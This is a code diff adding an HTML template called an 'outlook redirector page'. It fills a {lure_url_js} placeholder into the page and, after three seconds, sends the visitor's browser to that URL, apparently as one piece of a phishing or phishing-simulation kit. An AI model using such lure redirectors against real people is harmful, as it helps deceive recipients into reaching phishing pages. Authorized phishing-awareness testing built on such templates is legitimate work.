@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>outlook redirector page</title>
+</head>
+
+<body>
+  <h1>hello there this this is th outlook redirector page.... it will auto redirect in three seconds</h1>
+  <h3>{from_name}</h3>
+</body>
+<p id="url">{lure_url_js}</p>
+<script>
+  let text = document.getElementById('url').textContent;
+  const textArr = text.split(" + ");
+  text = textArr.join("");
+  text = text.replace(/\'/, "");
+  text = text.split("''")
+  text = text.join("");
+  text = text.replace("'", "");
+  console.log("link: ", text);
+  setTimeout(() => {
+    window.location.assign(text);
+  }, 3000)
+
+
+</script>
+
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
+  integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+
+</html>
